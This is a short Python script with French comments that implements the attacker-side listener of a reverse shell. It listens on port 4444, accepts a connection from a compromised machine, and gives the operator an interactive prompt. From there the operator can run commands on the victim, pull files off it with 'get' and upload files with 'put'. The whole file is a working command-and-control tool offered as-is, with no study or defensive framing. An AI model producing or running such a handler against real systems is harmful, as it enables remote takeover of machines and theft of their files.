import socket

def serveur_reverse_shell(ip, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen(1)
    print(f"Listening on {ip}:{port}...")

    conn, addr = server_socket.accept()
    print(f"Connection established with {addr}")

    while True:
        command = input("Shell> ")
        if command.lower() == "exit":
            conn.send(command.encode())
            break
        elif command.startswith("get "):
            conn.send(command.encode())
            with open(command.split(" ")[1], 'wb') as f:
                data = conn.recv(4096)
                f.write(data)
            print(f"Received file {command.split(' ')[1]}")
        elif command.startswith("put "):
            conn.send(command.encode())
            with open(command.split(" ")[1], 'rb') as f:
                data = f.read()
                conn.send(data)
            print(f"Sent file {command.split(' ')[1]}")
        else:
            conn.send(command.encode())
            result = conn.recv(4096).decode()
            print(result)

    conn.close()
    server_socket.close()

if __name__ == "__main__":
    ip = "192.168.1.118"  # L'adresse IP de votre machine
    port = 4444  # Le port que vous voulez utiliser
    serveur_reverse_shell(ip, port)
